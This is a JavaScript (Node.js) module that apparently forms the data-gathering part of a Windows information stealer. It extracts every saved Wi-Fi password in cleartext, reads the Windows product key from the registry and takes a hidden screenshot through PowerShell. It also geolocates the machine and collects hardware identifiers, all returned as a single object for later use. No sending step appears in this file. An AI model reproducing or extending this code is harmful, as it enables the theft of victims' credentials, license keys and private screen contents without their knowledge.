const child_process = require("child_process");
const diskusage     = require('diskusage');
const axios         = require('axios');
const util          = require("util");
const path          = require('path');
const os            = require('os');
const fs            = require('fs');

const exec = util.promisify(child_process.exec);

const execCommand = async (cmd) => {
    try {
        const { stdout } = await exec(cmd);
        return stdout.trim();
    } catch (error) {
        console.error(`Error executing command "${cmd}": ${error.message}`);
        return "";
    }
};

const getDisk = async () => {
    try {
        const output = await execCommand("wmic logicaldisk get size");
        const [size] = output.split(/\s+/).filter(item => item && item.toLowerCase() !== "size");
        return size ? (Math.floor(parseInt(size) / (1024 * 1024 * 1024))).toString() : "1000";
    } catch (error) {
        console.error(`Error fetching disk size: ${error.message}`);
        return "1000";
    }
};

const getTotalMemory = async () => {
    try {
        const output = await execCommand("wmic computersystem get totalphysicalmemory | more +1");
        return Math.floor(parseInt(output) / (1024 * 1024 * 1024));
    } catch (error) {
        console.error(`Error fetching total memory: ${error.message}`);
        return "0";
    }
};

const getCleanUUID = async () => {
    try {
        const output = await execCommand("wmic csproduct get uuid");
        const match = output.match(/UUID\s+([A-Fa-f0-9-]+)/);
        return match ? match[1] : "Not found";
    } catch (error) {
        console.error(`Error fetching UUID: ${error.message}`);
        return "0";
    }
};

const getCpuCount = async () => {
    try {
        const output = await execCommand("echo %NUMBER_OF_PROCESSORS%");
        return parseInt(output) || "4";
    } catch (error) {
        console.error(`Error fetching CPU count: ${error.message}`);
        return "0";
    }
};

const getNetwork = async () => {
    try {
        const response = await axios.get('http://ip-api.com/json');
        const data = response.data;
        return `IP: ${data.query}\nCountry: ${data.country}\nRegion: ${data.regionName}\nPostal: ${data.zip}\nCity: ${data.city}\nISP: ${data.isp}\nAS: ${data.as}\nLatitude: ${data.lat}\nLongitude: ${data.lon}`;
    } catch (error) {
        console.error("Failed to get network:", error);
        return "Not Found";
    }
}

const getWifi = () => {
    try {
        const output = child_process.execSync('netsh wlan show profiles', { stdio: 'pipe' }).toString();
        let networks = output.split('\n').filter(line => line.includes('All User Profile') || line.includes('Tous les utilisateurs'))
                              .map(line => line.split(':')[1].trim());
        let wifiInfo = '';
        networks.forEach(network => {
            try {
                const profileOutput = child_process.execSync(`netsh wlan show profile "${network}" key=clear`, { stdio: 'pipe' }).toString();
                const keyLine = profileOutput.split('\n').find(line => line.includes('Key Content') || line.includes('Contenu de la'));
                if (keyLine) {
                    wifiInfo += `${network} - ${keyLine.split(':')[1].trim()}\n`;
                }
            } catch (error) {}
        });

        return wifiInfo || "Not Found";
    } catch (error) {
        console.error("Failed to get wifi:", error);
        return "Not Found";
    }
}

function randString(length) {
    const charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let str = '';
    for (let i = 0; i < length; i++) {
        const randomIndex = Math.floor(Math.random() * charset.length);
        str += charset[randomIndex];
    }
    return str;
}

const getScreenShots = async () => {
    const dir = path.join(os.tmpdir(), randString(10));
    fs.mkdirSync(dir, { recursive: true });

    try {
        child_process.execSync(`powershell.exe -NoProfile -Command "Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $bitmap = New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height); $graphics = [System.Drawing.Graphics]::FromImage($bitmap); $graphics.CopyFromScreen([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Location, [System.Drawing.Point]::Empty, $bitmap.Size); $bitmap.Save('${path.join(dir, 'screenshot.png')}'); $graphics.Dispose(); $bitmap.Dispose();"`, { cwd: dir });
        const files = fs.readdirSync(dir);
        return files.map(file => path.join(dir, file));
    } catch (error) {
        console.error("Failed to capture screenshot:", error);
        return [];
    }
}

const getDisksInfo = async () => {
    try {
        const rootPath = os.platform() === 'win32' ? 'C:\\' : '/';

        const { available, total, free } = await diskusage.check(rootPath);

        const freeGB = (free / (1024 ** 3)).toFixed(2) + 'GB';
        const totalGB = (total / (1024 ** 3)).toFixed(2) + 'GB';
        const usedPercent = ((1 - (available / total)) * 100).toFixed(2) + '%';

        const column = 12;
        const header = [
            'Drive'.padEnd(column),
            'Free'.padEnd(column),
            'Total'.padEnd(column),
            'Use'.padEnd(column)
        ].join('');

        const output = [
            header,
            `${rootPath.padEnd(column)}${freeGB.padEnd(column)}${totalGB.padEnd(column)}${usedPercent.padEnd(column)}`
        ].join('\n');

        return output;
    } catch (error) {
        console.error("Failed to get disks info:", error);
        return 'Not Found';
    }
}

async function systemInfo() {
    try {
        const [
            WINDOWS_VERSION,
            WINDOWS_KEY,
            SCREENSHOTS,
            DISKS_INFO,
            CPU_COUNT,
            NETWORK,
            UUID,
            DISK,
            CPU,
            GPU,
            RAM,
            IP,
            OS,
        ] = await Promise.all([
            execCommand("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion' -Name ProductName"),
            execCommand("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault"),
            getScreenShots(),
            getDisksInfo(),
            getCpuCount(),
            getNetwork(),
            getCleanUUID(),
            getDisk(),
            execCommand("wmic cpu get name | more +1"),
            execCommand("wmic PATH Win32_VideoController get name | more +1"),
            getTotalMemory(),
            execCommand("powershell.exe (Resolve-DnsName -Name myip.opendns.com -Server 208.67.222.220).IPAddress"),
            execCommand("wmic OS get caption, osarchitecture | more +1"),
        ]);

        return {
            WINDOWS_VERSION,
            WINDOWS_KEY,
            SCREENSHOTS,
            DISKS_INFO,
            CPU_COUNT,
            NETWORK,
            UUID,
            DISK,
            CPU,
            GPU,
            RAM,
            IP,
            OS,
        };
    } catch (error) {
        console.error(`Error fetching system info: ${error.message}`);
        return {
            WINDOWS_VERSION: "Not Found",
            WINDOWS_KEY: "Not Found",
            SCREENSHOTS: "Not Found",
            DISKS_INFO: "Not Found",
            CPU_COUNT: "Not Found",
            NETWORK: "Not Found",
            UUID: "Not Found",
            DISK: "Not Found",
            CPU: "Not Found",
            GPU: "Not Found",
            RAM: "Not Found",
            IP: "Not Found",
            OS: "Not Found",
        };
    }
};

module.exports = {
    systemInfo
}